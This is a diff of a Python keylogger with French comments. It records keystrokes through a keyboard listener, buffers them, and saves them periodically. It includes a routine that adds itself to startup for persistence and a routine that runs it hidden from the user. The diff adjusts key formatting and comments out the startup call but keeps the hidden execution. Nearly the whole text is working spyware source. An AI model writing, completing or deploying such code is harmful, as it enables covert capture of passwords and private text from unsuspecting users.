@@ -26,7 +26,6 @@ if not os.path.exists(error_file):
 # Buffer pour stocker les frappes temporairement
 key_buffer = []
 shift_pressed = False  # Indicateur pour majuscules
-capslock_active = False  # Indicateur pour Caps Lock
 
 # Fonction pour ajouter le script au démarrage
 def add_to_startup():
@@ -71,27 +70,23 @@ def log_error(error):
 
 # Fonction pour capturer les frappes clavier
 def on_press(key):
-    global shift_pressed, capslock_active
+    global shift_pressed
     try:
         if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
             shift_pressed = True
-        elif key == keyboard.Key.caps_lock:
-            capslock_active = not capslock_active
-        elif hasattr(key, 'char') and key.char:
+        elif hasattr(key, 'char') and key.char:  # Capturer les caractères normaux
             char = key.char
-            if shift_pressed or capslock_active:
+            if shift_pressed:  # Convertir en majuscules si Shift est pressé
                 char = char.upper()
             key_buffer.append(char)
-        elif key == keyboard.Key.space:
+        elif key == keyboard.Key.space:  # Capturer les espaces
             key_buffer.append(" ")
-        elif key == keyboard.Key.enter:
-            key_buffer.append("[ENTER]\n")
-        elif key == keyboard.Key.tab:
-            key_buffer.append("[TAB]")
-        elif key == keyboard.Key.backspace:
+        elif key == keyboard.Key.enter:  # Capturer les retours à la ligne
+            key_buffer.append("\n")
+        elif key == keyboard.Key.tab:  # Capturer les tabulations
+            key_buffer.append("\t")
+        elif key == keyboard.Key.backspace:  # Gérer les backspaces
             handle_backspace()
-        elif key == keyboard.Key.esc:
-            key_buffer.append("[ESC]")
     except Exception as e:
         log_error(f"Erreur lors de la capture : {e}")
 
@@ -112,10 +107,10 @@ def handle_backspace():
     except Exception as e:
         log_error(f"Erreur lors de la gestion du BACKSPACE : {e}")
 
-# Exécuter une fois pour ajouter au démarrage
+# Exécuter une fois pour ajouter au démarrage et masquer l'exécution
 if __name__ == "__main__":
     if not os.environ.get("IS_RUNNING_HIDDEN"):
-        add_to_startup()
+        #add_to_startup()
         run_hidden()
 
     # Thread pour sauvegarder les frappes périodiquement
